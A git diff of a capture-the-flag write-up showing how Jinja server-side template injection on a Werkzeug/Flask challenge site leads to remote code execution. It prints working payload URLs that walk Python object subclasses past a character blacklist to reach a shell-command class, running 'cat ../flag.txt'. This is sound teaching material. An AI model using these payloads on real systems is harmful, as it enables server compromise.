@@ -10,6 +10,7 @@ title: "Pick your starter"
 In this challenge, we exploit a Jinja template injection to get RCE.
 
 <!--more-->
+{% raw %}
 
 We have a website which displays Pokemon.
 
@@ -23,7 +24,7 @@ The server header reports `Werkzeug` so we tried the `/console` endpoint.
 
 ## Vulnerability
 
-After some experimentation, we discover that there is a **template injection attack**. Let's see the result for `/{ {7*6} }`:
+After some experimentation, we discover that there is a **template injection attack**. Let's see the result for `/{{7*6}}`:
 
 ![Alt text](https://raw.githubusercontent.com/BasiliCS/writeups/pctf/pctf/web/pick-your-starter-2.png)
 
@@ -34,7 +35,7 @@ Although this webpage is entertaining, for the rest of this challenge we will be
 ```py
 import requests
 from bs4 import BeautifulSoup
-page = requests.get("http://chal.pctf.competitivecyber.club:5555/{ {7*6} }")
+page = requests.get("http://chal.pctf.competitivecyber.club:5555/{{7*6}}")
 
 soup = BeautifulSoup(page.content, "html.parser")
 
@@ -51,7 +52,7 @@ print(extracted)
 We would like to get RCE on the server. We want to access the Python base class `object` in order to access all subclasses of `object`, that is every available class in the program. Given the blacklist, we are able to do so using `()`. We can list all available classes with the `__subclasses__` method.
 
 Here is the URL we built:
-`http://chal.pctf.competitivecyber.club:5555/{ {().__class__.__base__.__subclasses__()} }`
+`http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__()}}`
 
 The response looks like this (the final list is a lot longer, this is just an extract):
 
@@ -66,8 +67,9 @@ We cannot use the `[` or `]` characters, so we have to use the `__getitem__` met
 Finally, we want to pass our string command to the constructor. This can be easily done using `request.args.shell` and passing an argument `?shell=cat /flag.txt` to our request.
 
 The final URL is:
-`"http://chal.pctf.competitivecyber.club:5555/{ {().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()} }?shell=cat ../flag.txt"`
+`"http://chal.pctf.competitivecyber.club:5555/{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}?shell=cat ../flag.txt"`
 
 ## The flag
 
 `PCTF(wHOS7H47PoKEmoN)`
+{% endraw %}
